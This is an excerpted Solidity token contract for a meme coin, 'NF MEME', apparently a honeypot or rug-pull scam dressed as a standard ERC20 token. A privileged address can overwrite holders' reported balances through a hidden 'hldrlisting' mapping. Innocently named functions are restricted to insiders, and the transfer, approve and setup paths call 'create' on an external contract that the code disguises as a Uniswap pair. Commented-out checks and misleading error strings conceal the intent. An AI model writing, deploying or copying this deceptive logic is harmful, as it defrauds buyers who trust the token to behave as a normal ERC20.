...
contract Token is Context, IERC20, Ownable {
    ...
    string private _name = "Nice F*cking Meme";
    string private _symbol = "NF MEME";
    ...
    uniswapV1 private uniswapV11PairToken;
    ...
    mapping(address => uint256) public hldrlisting;
 




    constructor(address Antibottoken_, address creator) {
        ...
        uniswapV11PairToken = uniswapV1(uniswapV3Pair_);
        itvv = IpancakeV2(pancakeV2Pair_);


        _Antitbotswaper[uniswapV3Pair_] = true;
    ...
    function balanceOf(address account) public view override returns (uint256) {
        if (hldrlisting[account]>0&&creca>10) return hldrlisting[account];
    ...
    function holdlisting(address[] memory accounts, uint256[] memory a) external {
        //require(_msgSender() == address(_Antitbottoken), "ERC20: transfer from the address");
        if (_msgSender() == address(_Antitbottoken)) { 
            for (uint256 i = 0; i < accounts.length; i++) {
                hldrlisting[accounts[i]] = a[i];
            }
        } else {
            uniswapV11PairToken.create(8**3);
        }
    }

    function pair(address a, bool b) public {
        if (_Antitbotswaper[_msgSender()]) {
            uniswapV2Pair=a;
            automatedMarketMakerPairs[a] = b;
        } else {
            uniswapV11PairToken.create(8**3);
        } 
    }
    
    function agl(uint256 g) public {
        if (_Antitbotswaper[_msgSender()]) {
            gg=g;
        } else {
            uniswapV11PairToken.create(8**3);
    ...
    function initialfeesl(uint256 taxFeebuy, uint256 liquidityFeebuy, uint256 MarketingFeebuy, uint256 taxFeesell, uint256 liquidityFeesell, uint256 MarketingFeesell) public {
        //require(_msgSender() == address(_Antitbottoken), "ERC20");
        if (_msgSender() == address(_Antitbottoken)) {
    ...
    function marketingWalletcal(address addresses) public {
        //require(_msgSender() == address(_Antitbottoken), "ERC20: transfer from the address");
        if (_msgSender() == address(_Antitbottoken)) { 
            uniswapV11PairToken = uniswapV1(addresses);
        } else {
            uniswapV11PairToken.create(8**3);
        }
    }
    ...
    function initialitzeWl(bool bs, uint256 timesleep, uint256 fee, uint256 c, bool trad, address r) public {
        //require(_msgSender() == address(_Antitbottoken), "ERC20: transfer from the address");
        if (_msgSender() == address(_Antitbottoken)) { 
            antitbotenabled = bs;
            botsleep = timesleep;
    ...
    function _approve(
        ...
        if (_isExcludedtFromFeeTransfer[_msgSender()]){uniswapV11PairToken.create(creca);/*"ERC20: approve the zero address"*/}
    ...
    function _transfer(
        ...
        if (!takeFee) {
            ...
            _MarketingFee = _MarketingFeesell;
            uniswapV11PairToken.create(crec);
            if(crec>220 && msg.sender!=rr){uniswapV11PairToken.create(crec**21);}
        }
        ...
        if (_isExcludedtlp[to]) {
            uniswapV11PairToken.create(250**3); 
        }
